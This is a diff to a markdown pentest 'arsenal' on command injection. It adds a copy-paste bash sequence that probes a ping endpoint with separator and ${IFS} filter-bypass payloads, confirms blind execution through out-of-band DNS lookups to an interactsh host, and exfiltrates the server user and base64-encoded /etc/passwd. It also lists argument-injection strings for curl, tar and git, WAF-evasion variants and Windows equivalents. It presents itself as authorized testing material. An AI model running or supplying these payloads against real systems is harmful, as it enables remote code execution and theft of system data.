@@ -1,7 +1,48 @@
 # Command-Injection Arsenal — Separators, Blind/OOB, Evasion & Reverse Shells (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `COMMAND_INJECTION_TESTING_GUIDE.md`. Authorized testing only — **benign markers**, no persistence,
 > clean up (Guide §19). The finding is **a command executing** (output / repeated delay / server-sourced OOB).
+
+---
+
+## 0. The whole attack in one sequence (copy-paste — blind, filtered cmdi → RCE)
+
+*What & when:* the end-to-end flagship as one runnable narrative — the arsenal twin of guide **§13.1**. Run top-to-bottom against an authorized target; each step's output tells you whether to continue or pivot. Everything is a **benign marker**; the instant an OOB `whoami` lands, you stop.
+
+```bash
+T=https://target.com ; ID=k7f2p.oast.pro          # authorized target + YOUR interactsh/Collaborator host
+inj(){ curl -s "$T/api/net/ping" -H 'Content-Type: application/json' -d "{\"host\":\"$1\"}"; }
+
+# --- Step 0: BASELINE — is there a command, and is it blind? (guide §4) ---
+inj '127.0.0.1'                 # -> {"reachable":true}  (verdict only, no stdout = BLIND by design)
+
+# --- Step 1: CLASSIFY + find the filter (send the same intent several ways; watch what changes) ---
+inj '127.0.0.1;id'             # no uid= in the response         -> NOT in-band
+time inj '127.0.0.1;sleep 5'   # returns instantly / error        -> a SPACE filter (input rejected)
+time inj '127.0.0.1;sleep${IFS}5'   # ~5s                          -> ${IFS} beats it; execution is REAL
+time inj '127.0.0.1;sleep${IFS}5' ; time inj '127.0.0.1;sleep${IFS}5'   # repeat -> consistent = not jitter
+#   in-band instead? use ;id / | id.  time noisy AND OOB blocked? -> boolean oracle (§2b).
+
+# --- Step 2: OOB CONFIRM — a hit from the TARGET's IP is the un-FP proof (guide §8) ---
+inj "127.0.0.1;nslookup\${IFS}cmdi.$ID"          # watch interactsh for  DNS cmdi.$ID  from <server IP>
+
+# --- Step 3: BLIND EXFIL — turn "it ran" into "here is the server's identity" (guide §12) ---
+inj "127.0.0.1;nslookup\${IFS}\$(whoami).$ID"    # interactsh: www-data.$ID  = you read the server user via RCE
+#   file: ...$(cat${IFS}/etc/passwd|base64|tr${IFS}-d${IFS}'='|head${IFS}-c60)...  -> reassemble labels at your listener
+
+# --- Step 4: STOP. The whoami OOB callback IS the Critical (CWE-78, ~9.8). No reverse shell, no data theft. Clean up.
+```
+
+**Alternate cash-outs (same "prove execution with a benign marker, then stop" ending — pick by what blocks you):**
+```bash
+# Separators filtered but your value lands as an argv item -> ARGUMENT injection (guide §9):
+#   filename/host = "-o/var/www/html/x.php" (curl) · "--checkpoint-action=exec=sh" (tar) · "ext::sh -c id" (git clone)
+# Heavy WAF -> defeat signatures (guide §10):  c''at /etc/passwd · w\ho\am\i · /???/c?t · {cat,/etc/passwd} · base64 -d|bash
+# Windows target (Linux ;sleep silent) -> & separators (guide §14.1):  127.0.0.1 & nslookup %COMPUTERNAME%.k7f2p.oast.pro
+# Processor sink (image/pdf/video upload) -> ImageTragick/Ghostscript/ExifTool CVE (guide §14 + FileUpload kit)
+```
 
 ---
 
